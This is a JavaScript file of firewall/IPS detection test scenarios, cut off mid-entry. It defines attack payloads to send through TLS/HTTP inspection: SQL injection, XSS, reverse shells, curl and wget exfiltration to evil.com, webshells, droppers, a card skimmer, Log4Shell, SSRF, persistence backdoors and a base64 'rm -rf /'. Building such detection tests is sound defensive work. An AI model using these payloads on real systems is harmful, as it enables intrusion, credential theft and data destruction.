// Firewall Detection Test Scenarios
// Tests whether inline TLS/HTTP inspection correctly detects and blocks
// known malicious payloads in GET/POST requests and responses.
//
// Categories:
//   FW — Firewall Detection (TLS), client-side
//   AN — Firewall Detection (HTTP/2), client-side
//
// Each payload is sent as a POST body (for request inspection) or expected
// in response (for response inspection via echo server). A firewall/IPS
// should detect and block the connection in either direction.

const crypto = require('crypto');

// ─── Payload Definitions ─────────────────────────────────────────────────────
// Each: { id, name, description, data: Buffer|string, method: 'POST'|'GET', severity }

const PAYLOADS = [

  // ── EICAR Test Patterns (Industry Standard AV Test) ──────────────────────
  {
    id: 'eicar-standard',
    name: 'EICAR standard test file',
    description: 'Standard EICAR antivirus test string (68 bytes)',
    data: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
    severity: 'critical',
  },
  {
    id: 'eicar-in-http-response',
    name: 'EICAR in HTTP response body',
    description: 'EICAR test file embedded in HTML page response',
    data: '<html><body>X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</body></html>',
    severity: 'critical',
  },
  {
    id: 'eicar-base64',
    name: 'EICAR base64 encoded',
    description: 'EICAR test file base64 encoded in POST body',
    data: Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*').toString('base64'),
    severity: 'critical',
  },
  {
    id: 'eicar-zip-header',
    name: 'EICAR with ZIP magic bytes',
    description: 'ZIP container header followed by EICAR test string',
    data: Buffer.concat([Buffer.from('504b0304', 'hex'), Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')]),
    severity: 'critical',
  },
  {
    id: 'eicar-multipart',
    name: 'EICAR in multipart form upload',
    description: 'EICAR embedded in multipart/form-data file upload',
    data: '--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.com"\r\nContent-Type: application/octet-stream\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n--boundary--',
    severity: 'critical',
  },

  // ── SQL Injection ────────────────────────────────────────────────────────
  {
    id: 'sqli-union-select',
    name: 'SQL injection UNION SELECT',
    description: 'Classic UNION-based SQL injection to extract data',
    data: "1' UNION SELECT username, password FROM users--",
    severity: 'high',
  },
  {
    id: 'sqli-or-true',
    name: 'SQL injection OR 1=1',
    description: 'Authentication bypass via always-true condition',
    data: "admin' OR '1'='1' --",
    severity: 'high',
  },
  {
    id: 'sqli-stacked-queries',
    name: 'SQL injection stacked queries',
    description: 'Stacked queries to drop table',
    data: "1; DROP TABLE users; --",
    severity: 'critical',
  },
  {
    id: 'sqli-time-based-blind',
    name: 'SQL injection time-based blind',
    description: 'Time-based blind injection using SLEEP/WAITFOR',
    data: "1' AND SLEEP(5)--",
    severity: 'high',
  },
  {
    id: 'sqli-error-based',
    name: 'SQL injection error-based',
    description: 'Error-based extraction using EXTRACTVALUE/UPDATEXML',
    data: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    severity: 'high',
  },
  {
    id: 'sqli-mysql-outfile',
    name: 'SQL injection INTO OUTFILE',
    description: 'MySQL file write via INTO OUTFILE',
    data: "1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
    severity: 'critical',
  },
  {
    id: 'sqli-hex-encoded',
    name: 'SQL injection hex-encoded payload',
    description: 'SQL injection with hex-encoded strings to evade filters',
    data: "1' UNION SELECT 0x61646d696e, 0x70617373776f7264 FROM users--",
    severity: 'high',
  },
  {
    id: 'sqli-comment-evasion',
    name: 'SQL injection with comment evasion',
    description: 'SQL injection using inline comments to bypass WAF',
    data: "1'/*!UNION*//*!SELECT*/username,password/*!FROM*/users--",
    severity: 'high',
  },
  {
    id: 'sqli-double-encoding',
    name: 'SQL injection double URL-encoded',
    description: 'Double-encoded SQL injection to bypass decoding filters',
    data: "1%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users--",
    severity: 'high',
  },
  {
    id: 'sqli-mssql-xp-cmdshell',
    name: 'SQL injection xp_cmdshell',
    description: 'MSSQL command execution via xp_cmdshell',
    data: "1'; EXEC xp_cmdshell('net user hacker P@ss123 /add'); --",
    severity: 'critical',
  },
  {
    id: 'sqli-nosql-injection',
    name: 'NoSQL injection MongoDB',
    description: 'MongoDB NoSQL injection via JSON operator',
    data: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    severity: 'high',
  },
  {
    id: 'sqli-second-order',
    name: 'SQL injection second-order',
    description: 'Stored SQL injection payload for later execution',
    data: "admin'-- ; INSERT INTO logs VALUES((SELECT password FROM users WHERE username='admin'))",
    severity: 'high',
  },

  // ── Cross-Site Scripting (XSS) ──────────────────────────────────────────
  {
    id: 'xss-script-tag',
    name: 'XSS basic script tag',
    description: 'Classic reflected XSS with script tags',
    data: '<script>alert("XSS")</script>',
    severity: 'high',
  },
  {
    id: 'xss-img-onerror',
    name: 'XSS img onerror handler',
    description: 'XSS via broken image tag with onerror event',
    data: '<img src=x onerror="alert(document.cookie)">',
    severity: 'high',
  },
  {
    id: 'xss-svg-onload',
    name: 'XSS SVG onload',
    description: 'XSS via SVG tag with onload event handler',
    data: '<svg onload="fetch(\'https://evil.com/?\'+document.cookie)">',
    severity: 'high',
  },
  {
    id: 'xss-event-handler',
    name: 'XSS body onload',
    description: 'XSS via body tag event handler',
    data: '<body onload="eval(atob(\'YWxlcnQoMSk=\'))">',
    severity: 'high',
  },
  {
    id: 'xss-javascript-uri',
    name: 'XSS javascript: URI',
    description: 'XSS via javascript: protocol in anchor href',
    data: '<a href="javascript:alert(document.domain)">click</a>',
    severity: 'high',
  },
  {
    id: 'xss-dom-based',
    name: 'XSS DOM manipulation',
    description: 'DOM-based XSS creating script element',
    data: '<div id="x"></div><script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>',
    severity: 'high',
  },
  {
    id: 'xss-polyglot',
    name: 'XSS polyglot payload',
    description: 'Multi-context XSS polyglot that works in multiple injection points',
    data: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    severity: 'high',
  },
  {
    id: 'xss-template-injection',
    name: 'XSS template injection',
    description: 'Server-side template injection (SSTI) payload',
    data: '{{constructor.constructor("return this.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    severity: 'critical',
  },
  {
    id: 'xss-cookie-theft',
    name: 'XSS cookie exfiltration',
    description: 'XSS payload that exfiltrates cookies to external server',
    data: '<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>',
    severity: 'critical',
  },
  {
    id: 'xss-encoded-entities',
    name: 'XSS HTML entity encoded',
    description: 'XSS using HTML entity encoding to bypass filters',
    data: '&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;',
    severity: 'high',
  },
  {
    id: 'xss-mutation',
    name: 'XSS mutation-based',
    description: 'XSS using browser HTML parser mutation for filter bypass',
    data: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    severity: 'high',
  },

  // ── Command Injection ───────────────────────────────────────────────────
  {
    id: 'cmdi-semicolon',
    name: 'Command injection semicolon',
    description: 'OS command injection via semicolon chaining',
    data: '; cat /etc/passwd',
    severity: 'critical',
  },
  {
    id: 'cmdi-pipe',
    name: 'Command injection pipe',
    description: 'OS command injection via pipe to second command',
    data: '| id; cat /etc/shadow',
    severity: 'critical',
  },
  {
    id: 'cmdi-backtick',
    name: 'Command injection backticks',
    description: 'OS command injection via shell backtick substitution',
    data: '`wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh`',
    severity: 'critical',
  },
  {
    id: 'cmdi-powershell',
    name: 'Command injection PowerShell',
    description: 'Windows PowerShell reverse shell command',
    data: '& powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
    severity: 'critical',
  },
  {
    id: 'cmdi-curl-exfil',
    name: 'Command injection curl exfiltration',
    description: 'Data exfiltration via curl to external server',
    data: '$(curl http://evil.com/collect?data=$(cat /etc/passwd | base64))',
    severity: 'critical',
  },
  {
    id: 'cmdi-python-reverse',
    name: 'Command injection Python reverse shell',
    description: 'Python-based reverse shell payload',
    data: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    severity: 'critical',
  },
  {
    id: 'cmdi-newline',
    name: 'Command injection newline',
    description: 'OS command injection via newline character',
    data: 'file.txt\ncat /etc/passwd\n',
    severity: 'critical',
  },
  {
    id: 'cmdi-bash-redirect',
    name: 'Command injection bash redirect',
    description: 'Bash reverse shell via /dev/tcp redirect',
    data: 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
    severity: 'critical',
  },

  // ── Path Traversal ─────────────────────────────────────────────────────
  {
    id: 'path-traversal-unix',
    name: 'Path traversal Unix /etc/passwd',
    description: 'Classic path traversal to read /etc/passwd',
    data: '../../../../../../../etc/passwd',
    severity: 'high',
    method: 'GET',
  },
  {
    id: 'path-traversal-windows',
    name: 'Path traversal Windows',
    description: 'Path traversal to read Windows system files',
    data: '..\\..\\..\\..\\windows\\system32\\config\\SAM',
    severity: 'high',
    method: 'GET',
  },
  {
    id: 'path-traversal-null-byte',
    name: 'Path traversal null byte',
    description: 'Path traversal with null byte to bypass extension checks',
    data: '../../../etc/passwd%00.jpg',
    severity: 'high',
    method: 'GET',
  },
  {
    id: 'path-traversal-double-encoded',
    name: 'Path traversal double-encoded',
    description: 'Double URL-encoded path traversal',
    data: '..%252f..%252f..%252fetc%252fpasswd',
    severity: 'high',
    method: 'GET',
  },
  {
    id: 'path-traversal-utf8',
    name: 'Path traversal UTF-8 overlong',
    description: 'Path traversal using UTF-8 overlong encoding',
    data: '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    severity: 'high',
    method: 'GET',
  },

  // ── Webshell Signatures ────────────────────────────────────────────────
  {
    id: 'webshell-php-system',
    name: 'PHP webshell system()',
    description: 'Simple PHP webshell using system() function',
    data: '<?php system($_GET["cmd"]); ?>',
    severity: 'critical',
  },
  {
    id: 'webshell-php-eval',
    name: 'PHP webshell eval()',
    description: 'PHP webshell using eval() with base64 decode',
    data: '<?php eval(base64_decode($_POST["code"])); ?>',
    severity: 'critical',
  },
  {
    id: 'webshell-php-passthru',
    name: 'PHP webshell passthru()',
    description: 'PHP webshell using passthru() for command execution',
    data: '<?php @passthru($_REQUEST["cmd"]); ?>',
    severity: 'critical',
  },
  {
    id: 'webshell-jsp',
    name: 'JSP webshell Runtime.exec()',
    description: 'Java JSP webshell using Runtime.exec()',
    data: '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) out.println(line); %>',
    severity: 'critical',
  },
  {
    id: 'webshell-asp',
    name: 'ASP webshell WSScript.Shell',
    description: 'ASP webshell using WScript.Shell for command execution',
    data: '<%Set oScript = Server.CreateObject("WSCRIPT.SHELL"):Set oExec = oScript.Exec("cmd /c " & Request("cmd")):Response.Write(oExec.StdOut.ReadAll())%>',
    severity: 'critical',
  },
  {
    id: 'webshell-python',
    name: 'Python webshell os.popen()',
    description: 'Python CGI webshell using os.popen()',
    data: '#!/usr/bin/python\nimport os,cgi\nform=cgi.FieldStorage()\nprint("Content-type:text/html\\n\\n"+os.popen(form["cmd"].value).read())',
    severity: 'critical',
  },
  {
    id: 'webshell-c99',
    name: 'C99 shell signature',
    description: 'Known C99 PHP shell identification strings',
    data: '<?php /* c99shell v.2.1 (PHP 7) */ $c99sh_sourcesurl="http://c99.gen.tr"; $c99sh_updateurl="http://c99.gen.tr/c99.txt"; ?>',
    severity: 'critical',
  },
  {
    id: 'webshell-b374k',
    name: 'b374k shell signature',
    description: 'Known b374k PHP shell identification pattern',
    data: '<?php /* b374k shell */ $GLOBALS["s"] = "b374k"; $func = "pr"."eg_"."re"."place"; $func("/."."*/e","\\x65\\x76\\x61\\x6C",".");?>',
    severity: 'critical',
  },

  // ── Malware File Signatures ────────────────────────────────────────────
  {
    id: 'malware-pe-header',
    name: 'Windows PE executable header',
    description: 'MZ/PE header signature — Windows executable download',
    data: Buffer.concat([
      Buffer.from('4d5a90000300000004000000ffff0000', 'hex'), // MZ header
      Buffer.alloc(44),
      Buffer.from('50450000', 'hex'), // PE signature at offset 0x3C
      Buffer.alloc(200), // Fake PE optional header
    ]),
    severity: 'high',
  },
  {
    id: 'malware-elf-header',
    name: 'Linux ELF executable header',
    description: 'ELF header signature — Linux executable download',
    data: Buffer.concat([
      Buffer.from('7f454c46', 'hex'), // ELF magic
      Buffer.from('02010100000000000000000002003e00', 'hex'), // ELF64 header
      Buffer.alloc(200),
    ]),
    severity: 'high',
  },
  {
    id: 'malware-mach-o-header',
    name: 'macOS Mach-O executable header',
    description: 'Mach-O header signature — macOS executable download',
    data: Buffer.concat([
      Buffer.from('feedface', 'hex'), // Mach-O magic (32-bit)
      Buffer.alloc(200),
    ]),
    severity: 'high',
  },
  {
    id: 'malware-java-class',
    name: 'Java class file header',
    description: 'Java compiled class file magic bytes (CAFEBABE)',
    data: Buffer.concat([
      Buffer.from('cafebabe', 'hex'),
      Buffer.from('00000034', 'hex'), // Java 8 version
      Buffer.alloc(200),
    ]),
    severity: 'medium',
  },
  {
    id: 'malware-vbs-dropper',
    name: 'VBScript malware dropper',
    description: 'VBScript file dropper using ADODB.Stream',
    data: 'Set objHTTP = CreateObject("MSXML2.XMLHTTP")\nobjHTTP.Open "GET", "http://evil.com/payload.exe", False\nobjHTTP.Send\nSet objStream = CreateObject("ADODB.Stream")\nobjStream.Type = 1\nobjStream.Open\nobjStream.Write objHTTP.ResponseBody\nobjStream.SaveToFile "C:\\Windows\\Temp\\payload.exe", 2',
    severity: 'critical',
  },
  {
    id: 'malware-bat-download',
    name: 'Batch file downloader',
    description: 'Windows batch file that downloads and executes payload',
    data: '@echo off\ncertutil -urlcache -split -f "http://evil.com/payload.exe" %TEMP%\\payload.exe\nstart %TEMP%\\payload.exe',
    severity: 'critical',
  },
  {
    id: 'malware-macro-autoopen',
    name: 'Office macro AutoOpen',
    description: 'VBA macro with AutoOpen that executes shell commands',
    data: 'Sub AutoOpen()\n  Dim objShell As Object\n  Set objShell = CreateObject("WScript.Shell")\n  objShell.Run "cmd /c powershell -ep bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="\n  Set objShell = Nothing\nEnd Sub',
    severity: 'critical',
  },
  {
    id: 'malware-ransomware-note',
    name: 'Ransomware note pattern',
    description: 'Typical ransomware payment demand message',
    data: 'YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your documents, photos, databases and other important files have been encrypted with strongest encryption and unique key.\nThe only method of recovering files is to purchase decrypt tool and unique key for you.\nSend $500 in Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nContact: decrypt@protonmail.com',
    severity: 'critical',
  },
  {
    id: 'malware-keylogger-js',
    name: 'JavaScript keylogger',
    description: 'Browser-based keylogger that exfiltrates keystrokes',
    data: '<script>document.addEventListener("keypress",function(e){new Image().src="https://evil.com/log?k="+e.key+"&u="+window.location.href;});</script>',
    severity: 'critical',
  },
  {
    id: 'malware-cryptominer',
    name: 'CoinHive cryptominer script',
    description: 'Browser-based cryptocurrency mining script signature',
    data: '<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous("SITE_KEY");miner.start();</script>',
    severity: 'high',
  },

  // ── Exploit Payloads ───────────────────────────────────────────────────
  {
    id: 'exploit-nop-sled',
    name: 'NOP sled shellcode pattern',
    description: 'x86 NOP sled (0x90 bytes) commonly preceding shellcode',
    data: Buffer.concat([
      Buffer.alloc(256, 0x90), // NOP sled
      // Common x86 shellcode stub (execve /bin/sh)
      Buffer.from('31c050682f2f7368682f62696e89e3505389e1b00bcd80', 'hex'),
    ]),
    severity: 'critical',
  },
  {
    id: 'exploit-format-string',
    name: 'Format string attack',
    description: 'Format string vulnerability exploitation (%x leak, %n write)',
    data: '%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n%n%n%n',
    severity: 'high',
  },
  {
    id: 'exploit-buffer-overflow',
    name: 'Buffer overflow pattern',
    description: 'Long string of As with EIP overwrite pattern (classic BOF)',
    data: Buffer.concat([
      Buffer.alloc(1024, 0x41), // AAAA...
      Buffer.from('deadbeef', 'hex'), // EIP overwrite
      Buffer.alloc(256, 0x90), // NOP sled
      Buffer.from('31c050682f2f7368682f62696e89e3505389e1b00bcd80', 'hex'),
    ]),
    severity: 'critical',
  },
  {
    id: 'exploit-log4shell',
    name: 'Log4Shell (CVE-2021-44228)',
    description: 'Log4j JNDI injection payload for remote code execution',
    data: '${jndi:ldap://evil.com:1389/exploit}',
    severity: 'critical',
  },
  {
    id: 'exploit-log4shell-obfuscated',
    name: 'Log4Shell obfuscated variant',
    description: 'Obfuscated Log4j JNDI payload using lookup nesting',
    data: '${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/x}',
    severity: 'critical',
  },
  {
    id: 'exploit-spring4shell',
    name: 'Spring4Shell (CVE-2022-22965)',
    description: 'Spring Framework RCE via class loader manipulation',
    data: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%7D',
    severity: 'critical',
  },
  {
    id: 'exploit-shellshock',
    name: 'Shellshock (CVE-2014-6271)',
    description: 'Bash Shellshock environment variable injection',
    data: '() { :;}; /bin/bash -c "cat /etc/passwd"',
    severity: 'critical',
  },
  {
    id: 'exploit-xxe',
    name: 'XML External Entity (XXE)',
    description: 'XXE injection to read local files',
    data: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    severity: 'critical',
  },
  {
    id: 'exploit-xxe-oob',
    name: 'XXE out-of-band exfiltration',
    description: 'Blind XXE via external DTD to exfiltrate data',
    data: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>bar</foo>',
    severity: 'critical',
  },
  {
    id: 'exploit-ssrf',
    name: 'SSRF internal service probe',
    description: 'Server-side request forgery targeting internal metadata service',
    data: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    severity: 'high',
    method: 'GET',
  },
  {
    id: 'exploit-deserialization-java',
    name: 'Java deserialization gadget',
    description: 'Java serialization magic bytes with commons-collections gadget chain',
    data: Buffer.concat([
      Buffer.from('aced0005', 'hex'), // Java serialization magic
      Buffer.from('737200', 'hex'), // TC_OBJECT + TC_CLASSDESC
      Buffer.from('org.apache.commons.collections.functors.InvokerTransformer'),
      Buffer.alloc(100),
    ]),
    severity: 'critical',
  },

  // ── Data Exfiltration Patterns ─────────────────────────────────────────
  {
    id: 'exfil-credit-card',
    name: 'Credit card number pattern',
    description: 'Bulk credit card numbers in POST body (PCI-DSS violation)',
    data: 'card_data=4532015112830366,4916338506082832,4024007103939509,4556737586899855,4716989580001180,5425233430109903,2222420000001113,5105105105105100',
    severity: 'critical',
  },
  {
    id: 'exfil-ssn-pattern',
    name: 'Social Security Number pattern',
    description: 'Bulk SSN patterns in POST body (PII exfiltration)',
    data: 'records=078-05-1120,219-09-9999,457-55-5462,321-54-9876,123-45-6789,987-65-4321,111-22-3333,444-55-6666',
    severity: 'critical',
  },
  {
    id: 'exfil-private-key',
    name: 'Private key exfiltration',
    description: 'RSA private key material in HTTP body',
    data: '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA2Z3qX2BTLS4e/AT0pGrGkKgnifbLtPXyWNG6bV0PxM5SNOOU\ncH8AH+a8B2OQKAM1lxGBCMEFCACGvECr8YyhJFW0zMfPkjC3HB0VreOB+fvrRYe0\n' + 'A'.repeat(200) + '\n-----END RSA PRIVATE KEY-----',
    severity: 'critical',
  },
  {
    id: 'exfil-aws-keys',
    name: 'AWS access key exfiltration',
    description: 'AWS access key and secret key pair in HTTP body',
    data: 'aws_access_key_id=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion=us-east-1',
    severity: 'critical',
  },
  {
    id: 'exfil-database-dump',
    name: 'Database dump pattern',
    description: 'SQL database dump with table structure and credentials',
    data: "-- MySQL dump 10.13\nINSERT INTO `users` VALUES (1,'admin','$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi','admin@example.com'),(2,'john','$2y$10$kFp8rG2n.vWi0BPcqKDrOeVLH3zePSHN/xOZVuT/x3.yJBqk3TbLm','john@test.com');",
    severity: 'critical',
  },

  // ── Malicious HTTP Content ─────────────────────────────────────────────
  {
    id: 'malicious-iframe-injection',
    name: 'Hidden iframe injection',
    description: 'Invisible iframe loading exploit kit landing page',
    data: '<iframe src="https://evil.com/exploit-kit/landing" style="width:0;height:0;border:0;position:absolute;left:-9999px"></iframe>',
    severity: 'high',
  },
  {
    id: 'malicious-redirect-chain',
    name: 'Malicious redirect chain',
    description: 'Meta refresh redirect to phishing site',
    data: '<html><head><meta http-equiv="refresh" content="0;url=https://evil.com/phishing/login.html"></head><body>Redirecting...</body></html>',
    severity: 'high',
  },
  {
    id: 'malicious-drive-by-download',
    name: 'Drive-by download trigger',
    description: 'JavaScript auto-download of executable file',
    data: '<script>var a=document.createElement("a");a.href="data:application/x-msdownload;base64,TVqQAAMAAAA";a.download="update.exe";document.body.appendChild(a);a.click();</script>',
    severity: 'critical',
  },
  {
    id: 'malicious-formjacking',
    name: 'Formjacking/card skimmer',
    description: 'JavaScript credit card skimmer (Magecart-style)',
    data: '<script>document.querySelector("form").addEventListener("submit",function(e){var d=new FormData(e.target);fetch("https://evil.com/collect",{method:"POST",body:JSON.stringify({cc:d.get("card"),exp:d.get("expiry"),cvv:d.get("cvv")})});});</script>',
    severity: 'critical',
  },

  // ── LDAP & Directory Injection ─────────────────────────────────────────
  {
    id: 'ldap-injection',
    name: 'LDAP injection authentication bypass',
    description: 'LDAP injection to bypass authentication',
    data: '*)(uid=*))(|(uid=*',
    severity: 'high',
  },
  {
    id: 'ldap-jndi-lookup',
    name: 'JNDI LDAP lookup injection',
    description: 'JNDI lookup via LDAP for remote class loading',
    data: '${jndi:ldap://evil.com:1389/cn=exploit,dc=evil,dc=com}',
    severity: 'critical',
  },

  // ── Server-Side Request Forgery (SSRF) ─────────────────────────────────
  {
    id: 'ssrf-cloud-metadata',
    name: 'SSRF cloud metadata access',
    description: 'SSRF targeting AWS/GCP/Azure metadata endpoints',
    data: 'url=http://169.254.169.254/latest/meta-data/\nurl=http://metadata.google.internal/computeMetadata/v1/\nurl=http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    severity: 'critical',
  },
  {
    id: 'ssrf-internal-scan',
    name: 'SSRF internal network scan',
    description: 'SSRF probing internal services and ports',
    data: 'url=http://10.0.0.1:8080/admin\nurl=http://192.168.1.1:22\nurl=http://172.16.0.1:3306',
    severity: 'high',
  },

  // ── Known Malware Patterns & Signatures ────────────────────────────────
  {
    id: 'malware-mimikatz-strings',
    name: 'Mimikatz credential dump strings',
    description: 'Known Mimikatz tool identification strings',
    data: 'mimikatz(commandline) # sekurlsa::logonpasswords\nprivilege::debug\nlsadump::sam\nkerberos::list /export',
    severity: 'critical',
  },
  {
    id: 'malware-metasploit-payload',
    name: 'Metasploit Meterpreter staging',
    description: 'Metasploit reverse TCP Meterpreter stager pattern',
    data: Buffer.concat([
      Buffer.from('fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff', 'hex'),
      Buffer.alloc(200),
    ]),
    severity: 'critical',
  },
  {
    id: 'malware-cobalt-strike-beacon',
    name: 'Cobalt Strike beacon config',
    description: 'Cobalt Strike malleable C2 profile beacon configuration',
    data: 'set sleeptime "60000";\nset jitter "20";\nset useragent "Mozilla/5.0";\nhttp-get {\n  set uri "/api/v1/session";\n  client {\n    header "Accept" "application/json";\n  }\n}',
    severity: 'critical',
  },
  {
    id: 'malware-empire-stager',
    name: 'PowerShell Empire stager',
    description: 'PowerShell Empire agent staging payload',
    data: 'powershell -noP -sta -w 1 -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcA',
    severity: 'critical',
  },
  {
    id: 'malware-wannacry-killswitch',
    name: 'WannaCry ransomware signature',
    description: 'WannaCry ransomware kill switch domain and encryption marker',
    data: 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\nWANACRY!\n.WNCRY\ntasksche.exe\n@WanaDecryptor@.exe',
    severity: 'critical',
  },
  {
    id: 'malware-emotet-dropper',
    name: 'Emotet dropper URL pattern',
    description: 'Emotet malware dropper URL patterns and loader strings',
    data: 'regsvr32 /s C:\\Users\\Public\\' + crypto.randomBytes(8).toString('hex') + '.dll\nrundll32 C:\\ProgramData\\' + crypto.randomBytes(6).toString('hex') + '.dll,DllRegisterServer',
    severity: 'critical',
  },
  {
    id: 'malware-apt-beacon',
    name: 'APT C2 beacon pattern',
    description: 'Advanced persistent threat command-and-control beacon',
    data: JSON.stringify({
      id: crypto.randomBytes(16).toString('hex'),
      type: 'beacon',
      hostname: 'DESKTOP-VICTIM01',
      username: 'admin',
      os: 'Windows 10 Enterprise',
      arch: 'x64',
      pid: 4812,
      interval: 300,
      commands: ['whoami', 'ipconfig', 'net user'],
    }),
    severity: 'critical',
  },

  // ── Encoded / Obfuscated Payloads ──────────────────────────────────────
  {
    id: 'obfuscated-base64-exec',
    name: 'Base64-encoded command execution',
    description: 'Base64-encoded malicious command (decoded: rm -rf /)',
    data: 'eval(atob("cm0gLXJmIC8="))',
    severity: 'critical',
  },
  {
    id: 'obfuscated-hex-shellcode',
    name: 'Hex-encoded shellcode in script',
    description: 'JavaScript with hex-encoded shellcode for execution',
    data: 'var s="\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x6e\\x65\\x74\\x20\\x75\\x73\\x65\\x72\\x20\\x68\\x61\\x63\\x6b\\x65\\x72\\x20\\x50\\x40\\x73\\x73";eval(s);',
    severity: 'critical',
  },
  {
    id: 'obfuscated-concat-evasion',
    name: 'String concatenation evasion',
    description: 'Payload split via concatenation to evade signature matching',
    data: "var a='sy';var b='st';var c='em';require('child_pro'+'cess').exec(a+b+c+'(\"calc.exe\")')",
    severity: 'high',
  },
  {
    id: 'obfuscated-unicode-escape',
    name: 'Unicode escape sequence payload',
    description: 'Attack payload using Unicode escape sequences',
    data: '\\u003cscript\\u003ealert(document.\\u0063ookie)\\u003c/script\\u003e',
    severity: 'high',
  },
  {
    id: 'obfuscated-charcode',
    name: 'String.fromCharCode evasion',
    description: 'XSS payload constructed from character codes',
    data: '<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>',
    severity: 'high',
  },

  // ── Protocol-Level Attacks ─────────────────────────────────────────────
  {
    id: 'http-request-smuggling',
    name: 'HTTP request smuggling CL.TE',
    description: 'HTTP request smuggling via Content-Length / Transfer-Encoding conflict',
    data: 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    severity: 'critical',
  },
  {
    id: 'http-response-splitting',
    name: 'HTTP response splitting / CRLF injection',
    description: 'CRLF injection to inject headers and split HTTP response',
    data: 'value%0d%0aSet-Cookie:%20session=hijacked%0d%0a%0d%0a<html>Injected</html>',
    severity: 'high',
  },
  {
    id: 'http-host-header-attack',
    name: 'Host header injection',
    description: 'Host header manipulation for cache poisoning / password reset',
    data: 'Host: evil.com\r\nX-Forwarded-Host: evil.com\r\nX-Host: evil.com\r\nX-Forwarded-Server: evil.com',
    severity: 'high',
  },

  // ── Backdoor / Persistence Patterns ────────────────────────────────────
  {
    id: 'backdoor-cron-persistence',
    name: 'Cron job persistence backdoor',
    description: 'Adding crontab entry for persistent reverse shell',
    data: '* * * * * /bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n@reboot /tmp/.hidden_backdoor.sh',
    severity: 'critical',
  },
  {
    id: 'backdoor-ssh-key-injection',
    name: 'SSH authorized_keys injection',
    description: 'Injecting SSH public key for persistent access',
    data: 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7' + 'A'.repeat(100) + ' attacker@evil" >> /root/.ssh/authorized_keys',
    severity: 'critical',
  },
  {
    id: 'backdoor-systemd-service',
    name: 'Systemd service persistence',
    description: 'Creating systemd service for persistent backdoor',
